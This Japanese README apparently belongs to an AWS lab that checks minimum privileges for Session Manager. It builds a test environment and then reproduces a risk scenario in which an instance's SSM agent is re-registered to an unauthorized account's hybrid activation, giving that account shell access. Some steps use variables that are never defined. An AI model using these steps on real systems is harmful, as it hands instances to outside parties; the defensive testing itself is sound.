# SessionManager-MinimumPrivilege
Systems Manager - Session Managerを利用する場合の最小権限の確認



# 検証手順
## (1)事前設定
### (1)-(a) 作業環境の準備
下記を準備します。
* bashが利用可能な環境(LinuxやMacの環境)
* aws-cliのセットアップ
* AdministratorAccessポリシーが付与され実行可能な、aws-cliのProfileの設定

### (1)-(b) gitのclone
```shell
git clone https://github.com/Noppy/SessionManager-MinimumPrivilege.git
cd SessionManager-MinimumPrivilege
```

### (1)-(c) CLI実行用の事前準備
これ以降のAWS-CLIで共通で利用するパラメータを環境変数で設定しておきます。
```shell
export PROFILE=<Fargaeを動かすComputeAccount用のプロファイルを指定>
export REGION=<デプロイ先のリージョン>

#プロファイルの動作テスト
aws --profile ${PROFILE} sts get-caller-identity

```

## (2)環境の準備
### (2)-(a) VPC作成
```shell
# ComputeVPC
aws --profile ${PROFILE} --region ${REGION} \
    cloudformation create-stack \
        --stack-name SSMTestVPC \
        --template-body "file://./src/vpc-2az-4subnets.yaml" \
        --parameters "file://./src/SSmTestVpc.json" \
        --capabilities CAPABILITY_IAM ;
```
### (2)-(b) VPCエンドポイント作成
```shell
aws --profile ${PROFILE} --region ${REGION} \
    cloudformation create-stack \
        --stack-name SSMTestVpce \
        --template-body "file://./src/vpce-allowall.yaml"
```

### (2)-(c) インスタンス作成
```shell
KEYNAME="CHANGE_KEY_PAIR_NAME"  #環境に合わせてキーペア名を設定してください。
```
```shell
#最新のAmazon Linux2のAMI IDを取得します。
AMIID=$(aws --profile ${PROFILE} --region ${REGION} --output text \
    ec2 describe-images \
        --owners amazon \
        --filters 'Name=name,Values=amzn2-ami-hvm-2.0.????????.?-x86_64-gp2' \
                  'Name=state,Values=available' \
        --query 'reverse(sort_by(Images, &CreationDate))[:1].ImageId' ) ;

#Clientインスタンス作成
CFN_STACK_PARAMETERS='
[
  {
    "ParameterKey": "AmiId",
    "ParameterValue": "'"${AMIID}"'"
  },
  {
    "ParameterKey": "KeyName",
    "ParameterValue": "'"${KEYNAME}"'"
  }
]'

aws --profile ${PROFILE} --region ${REGION} \
    cloudformation create-stack \
        --stack-name SSMTestInstances \
        --template-body "file://./src/bastion_and_testinstance.yaml" \
        --parameters "${CFN_STACK_PARAMETERS}" \
        --capabilities CAPABILITY_IAM ;
```
## (3)ログイン
```shell
#BastionとSSMインスタンスのIPを確認する
aws --profile ${PROFILE} --region ${REGION} \
    cloudformation describe-stacks \
        --stack-name SSMTestInstances  \
        --query 'Stacks[].Outputs'

#SSHでBastionに接続
ssh-add
ssh -A ec2-user@<上記で確認したBastionのPublic IPアドレス>
```
```shell
#Bastionサーバ
ssh <上記で確認したSsmのPrivate IPアドレス>

# Setup AWS CLI
REGION=$(curl -s http://169.254.169.254/latest/meta-data/placement/availability-zone | sed -e 's/.$//')
aws configure set region ${REGION}
aws configure set output json
```


## セキュリティリスクシナリオの確認
Systems Managerのハイブリットアクティベーション機能を利用し、不正なAWSアカウントのSSMにVPCエンドポイント経由でSSM接続し、セッションマネージャで不正アクセスするシナリオを再現します。
### (1) 不正アカウントでSystems Managerのハイブリットアクティベーション作成
手元の作業PCで以下の手順で、不正なAWSアカウントにハイブリットアクティベーションを作成します。
#### (1)-(a)事前準備
```shell
UNAUTH_PROFILE="<不正アカウントのAdmin権限のあるプロファイルを指定>"
UNAUTH_REGION="${REGION}"
```
#### (1)-(b)ハイブリットアクティベーション用のIAMロール作成
```shell
#必要情報の取得
AccountID=$(aws --profile ${OTHER_PROFILE} --output text sts get-caller-identity --query 'Account')

# ハイブリットアクティベーション用のロール作成
ASSUME_ROLE_JSON='{
   "Version":"2012-10-17",
   "Statement":[
      {
         "Sid":"",
         "Effect":"Allow",
         "Principal":{
            "Service":"ssm.amazonaws.com"
         },
         "Action":"sts:AssumeRole",
         "Condition":{
            "StringEquals":{
               "aws:SourceAccount":"'"${AccountID}"'"
            },
            "ArnEquals":{
               "aws:SourceArn":"arn:aws:ssm:'"${OTHER_REGION}"':'"${AccountID}"':*"
            }
         }
      }
   ]
}'
# ロール作成
aws --profile ${UNAUTH_PROFILE} \
    iam create-role \
        --role-name "SSMActivationServiceRole" \
        --assume-role-policy-document "${ASSUME_ROLE_JSON}" \
        --max-session-duration 43200

#Policyのアタッチ
aws --profile ${UNAUTH_PROFILE} \
    iam attach-role-policy \
        --role-name "SSMActivationServiceRole" \
        --policy-arn arn:aws:iam::aws:policy/AmazonSSMManagedInstanceCore

#Policyのアタッチ
aws --profile ${UNAUTH_PROFILE} \
    iam attach-role-policy \
        --role-name "SSMActivationServiceRole" \
        --policy-arn arn:aws:iam::aws:policy/AmazonSSMDirectoryServiceAccess

```
#### (1)-(c)ハイブリットアクティベーション作成
ハイブリットアクティベーションを作成し、作成されたアクティベーションのIDとCODEを控えておきます。
```shell
aws --profile ${UNAUTH_PROFILE} --region ${UNAUTH_REGION} \
    ssm create-activation \
      --iam-role "SSMActivationServiceRole" \
      --registration-limit 10

# 上記を実行時のリターンで表示されるIDとCodeを控えておく
# {
#    "ActivationId": "xxxx",
#    "ActivationCode": "xxxxx"
# }
```
#### (1)-(d)インスタンスの追加
SsmTestインスタンスのOSにログインし、上記のアクティベーション情報を利用して不正アカウントのSSMにSsmTestインスタンスを登録しいます。
```shell
#以下のコマンドは、SSMTestインスタンスにログインした状態で実行する。
ID="<アクティベーションのActivationId>"
CODE="<アクティベーションのActivationCode>"
REGION="<アクティベーションを作成したリージョン>"

#SSMエージェントの停止
sudo systemctl stop amazon-ssm-agent

#不正アカウントのアクティベーションへの登録
sudo amazon-ssm-agent -register -code "${CODE}" -id "${ID}" -region "${REGION}"

# 以下のメッセージが出力されればOK
# INFO Successfully registered the instance with AWS SSM using Managed instance-id: mi-xxxxx"

#SSMエージェント起動
sudo systemctl start amazon-ssm-agent
```
#### (1)-(e)不正アカウントでの確認ンスタンスの追加
不正アカウントのマネージメントコンソールで以下ができることを確認する。
- Systems Managerのフリーとマネージャーに該当インスタンスが存在すること
- セッションマネージャで該当インスタンスにアクセス可能であること
